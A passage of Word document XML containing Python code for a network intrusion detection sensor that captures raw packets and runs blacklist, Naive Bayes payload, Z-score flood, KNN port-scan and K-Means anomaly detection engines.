    <w:p w14:paraId="489714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required_consecutive=self.config.ddos_consecutive_intervals)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66F025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self.knn_engine = knn.KNNMonitor(k=self.config.knn_k)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25E7FC4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self.payload_engine = naive_bayes.PayloadMonitor(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FC6D7F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confidence_threshold=self.config.payload_confidence)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A58B95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self.kmeans_engine = kmeans.KMeansMonitor(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58CBDD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k=self.config.kmeans_k, learning_rate=self.config.kmeans_alpha)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="200ECA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self.blacklist = bloom.BloomFilter(size=self.config.bloom_size,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="726F402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hash_count=self.config.bloom_hashes)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30FD9C52" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0C62C27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threat intelligence: file-based feed, falling back to a seed pair</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43CA3B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self.config.blacklist_file:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4069A2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self.blacklist.load_feed(self.config.blacklist_file) &lt;= 0:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F8CEE0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self._seed_blacklist()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C9587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else:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F7069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self._seed_blacklist()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="368D03C9" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5AD7022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self.parser = parser_mod.PacketParser()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="057A34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self.reporter = reporting.ReportGenerator()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C33BA9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self.ips = active_defense.ActiveDefense(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="278B15C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whitelist=self.config.block_whitelist)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DCFD0C9" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="48895FC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self.audit_log = logger_mod.Logger(self.config.log_file,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="592CF87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config=self.config)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D44C1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self.remote = None</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41C118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forward_alerts:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27E088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self.remote = logger_mod.UDPSender(self.config.udp_host,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BD1FFF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self.config.udp_port,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7254D1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config=self.config)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AE621AB" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="29A66D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self.dispatcher = dispatcher_mod.AlertDispatcher(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70C45D5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self.config, reporter=self.reporter, alert_queue=alert_queue,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="383D73C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logger=self.audit_log, remote=self.remote, defense=self.ips)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="289044EF" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="41B146E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optional live pcap capture, verifiable in Wireshark</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48FA3A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self.pcap_writer = None</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42A043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self.config.pcap_file:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="193794A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044E4D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self.pcap_writer = pcap.PcapWriter(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B00970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self.config.pcap_file, snaplen=self.config.pcap_snaplen)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70AF75E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writing capture to %s (snaplen %d)"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="164A46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(self.config.pcap_file, self.config.pcap_snaplen))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A882F8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OSError as e:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15932AD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could not open pcap file:", e)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49DFAF82" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="255CDE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packet_store.STORE = packet_store.PacketStore(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76D296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maxlen=self.config.packet_buffer)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07DBC71C" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1572425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self.import_brain_state()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B678374" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2D2AEB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self.packet_count = 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6295CEB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self.unique_ports = set()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28275B4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self.source_stats = {}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08E694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self.scan_active_sources = set()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10DFCCE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self.last_time = time.time()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74C4CE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self.is_running = True</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D41451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self.dropped = 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C0526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self.started_at = time.time()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C8FBE3E" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="71822E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_seed_blacklist(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A2FBCF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ip in ("192.168.1.200", "10.0.0.66"):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0472276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self.blacklist.add(ip)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A5F618E" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="282E601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capture -------------------------------------------------------</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16288A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_sniffer_thread(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C53430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pull packets off the wire as fast as possible, drop on overflow</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1140203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641FC2C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 = socket.socket(socket.AF_PACKET, socket.SOCK_RAW,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31812B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socket.ntohs(0x0003))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="437C544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PermissionError:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13BA6B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need sudo for raw sockets")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71C0DE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self.is_running = False</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F25BA5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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="356B22A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AttributeError:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A1E3D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AF_PACKET unavailable (Linux only). "</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="251A40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"Use replay.py for offline analysis on this platform.")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B2CEB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self.is_running = False</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05581BE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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2032A750" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5249655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sniffer up")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64C21D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while self.is_running:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06007D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5BEADF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raw, _ = s.recvfrom(65535)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C9AC5B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389F48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self.packet_queue.put_nowait(raw)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51AD6C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queue.Full:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0539C2A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self.dropped += 1  # analyzer is too slow - drop</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13ED5D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Exception as e:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1431995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self.is_running:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DD4603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sniffer error:", e)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="677D08DB" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="42C9ADB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analysis ------------------------------------------------------</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E19745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_analyzer_thread(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4190C5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analyzer up - 5 engines, dispatcher armed")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69F8C3C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while self.is_running:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="077AF9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13C20E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raw = self.packet_queue.get(timeout=0.5)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16B6C36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queue.Empty:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C73D6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self._run_timer_checks()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03039A9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continue</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C4F3880" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="46375A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self._run_timer_checks()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="549A7C3D" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="459D0AE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self.pcap_writer is not None:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34B7F21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0FD05D9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self.pcap_writer.write(raw)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47A2300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Exception:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3419912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pass  # never let forensics break detection</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53E159E2" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="074204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 = self.parser.parse(raw)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AA41A7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pkt is None:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5498D3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continue</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0609CC62" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="40F290E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ignore our own dashboard traffic so the sensor cannot alert on</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34AE152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the analyst watching it (self-noise feedback loop)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="156E89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(pkt["sport"] in (self.config.http_port, self.config.udp_port)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C9FE7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or pkt["dport"] in (self.config.http_port,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D7753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self.config.udp_port)):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55D87E4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continue</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D7055F5" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="099E89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Interval counters must describe the same successfully parsed,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2217340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in-scope traffic. Counting every raw Ethernet frame here used to</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F341A5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produce impossible observations such as PPS &gt; 0 with zero ports.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CE2F94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self.packet_count += 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A8227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 = pkt["src"]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E27E7B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source_observation = self.source_stats.setdefault(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BF2075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 {"packets": 0, "ports": set()})</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F0F771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source_observation["packets"] += 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F592824" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7A65C50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Bloom Filter: IP reputation, O(k) per packet ---</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D451A4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rep = self.blacklist.analyse(src)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F0DE33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rep.is_threat:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62D1C0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self.dispatcher.dispatch(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23E5A33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"BLACKLISTED IP DETECTED: %s" % src,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BB378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kind="blacklist", src_ip=src, confidence=rep.confidence,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F1378B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engine="Bloom Filter (reputation)",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="590A63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response_status=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E98756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self._record_packet(raw, pkt, "BLACKLIST")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39DDB27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continue</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09142705" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6529AF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pkt["dport"]:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B42770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self.unique_ports.add(pkt["dport"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FDDC1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source_observation["ports"].add(pkt["dport"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="495549E7" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="68010D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Naive Bayes: Layer 7 payload inspection ---</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B62F3D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verdict_tag = "clean"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E30D13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pkt["payload"]:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61D857C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 = self.payload_engine.analyse(pkt["payload"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43ACF4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verdict.is_threat:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D3E88F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verdict_tag = "MALICIOUS"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="431A22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self.dispatcher.dispatch(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CBA05A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"MALICIOUS PAYLOAD! Confidence: %.2f%% Keywords: %s"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6778D7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(verdict.confidence * 100,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21F11E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verdict.detail["keywords"]),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A2900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src_ip=src, confidence=verdict.confidence,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52149EC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payload=pkt["payload"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C1CBBC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engine="Naive Bayes (payload)")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="755C4F3A" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="71585C2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self._record_packet(raw, pkt, verdict_tag)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65D53124" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3ECB29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_run_timer_checks(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="130754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now = time.time()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B4E341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(now - self.last_time) &lt; 1.0:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22311F7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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5191BCAD" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5F0010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pps = self.packet_count</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20865F5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ports = len(self.unique_ports)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E052A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source_stats = self.source_stats</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0732032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dominant_src = self._dominant_source(source_stats, pps)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24AFFAB0" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0E30ED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Z-Score: volumetric flood ---</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="061A16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zv = self.stats_engine.analyse(pps)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31EF6F1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mean = zv.detail["mean"]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4984FCF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z = zv.detail["z_score"]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DE9CAD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Dispatch once when a sustained DDoS episode begins. The active flag</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D16EF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remains true for dashboard status without flooding the event stream</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53FC209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with a duplicate alert every second.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A7B02A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zv.detail["new_threat"]:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C2139D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self.dispatcher.dispatch(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11B525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"DDoS DETECTED! Z-Score: %.2f (PPS: %d)" % (z, pps),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D753FF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kind="ddos", src_ip=dominant_src, confidence=zv.confidence,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4624AA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engine="Z-Score (statistical)")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07B07EFB" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="190411C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KNN: per-source port-scan behaviour ---</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C2B4B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current_scan_sources = set()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33FB39A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src, observation in source_stats.items():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47E057B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src_packets = observation["packets"]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04921EB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src_ports = len(observation["ports"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74B00E8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kv = self.knn_engine.analyse(src_ports, src_packets)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="212AC4B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kv.is_threat:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00C9484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current_scan_sources.add(src)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44E643D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src not in self.scan_active_sources:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50C5D24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self.dispatcher.dispatch(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5021733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"PORT SCAN DETECTED! (Unique Ports: %d/sec)"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E4DFB5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src_ports,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00B11EB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kind="scan", src_ip=src, confidence=kv.confidence,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25F322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engine="KNN (behavioural)")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B7002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self.scan_active_sources = current_scan_sources</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="132E493C" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="71BC44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K-Means: novelty / behavioural drift ---</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EAE53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cv = self.kmeans_engine.analyse(pps, ports)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60CFEA8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cv.is_threat and not current_scan_sources and not zv.is_threat:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2366227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self.dispatcher.dispatch(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20447F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"ANOMALY DETECTED (Cluster %d)! Suspicious activity."</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EED75E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cv.detail["cluster"], kind="anomaly",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76D0021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src_ip=dominant_src, confidence=cv.confidence,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24ED25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engine="K-Means (clustering)")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38D64714" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0F7195A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packet_store.STORE.update_stats(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1386AA7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pps, mean, z,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3045802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ddos_candidate=zv.detail["volume_candidate"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="755310F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ddos_active=zv.is_threat)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EBFC7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self.stats_queue:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E56453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self.stats_queue.put({</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EA9E0C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"pps": pps,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56226E6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"mean": mean,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01F1E2A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"z_score": z,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3790B87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"ddos_candidate": zv.detail["volume_candidate"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4602B0D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"ddos_active": zv.is_threat,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7046E4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AB025CC" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
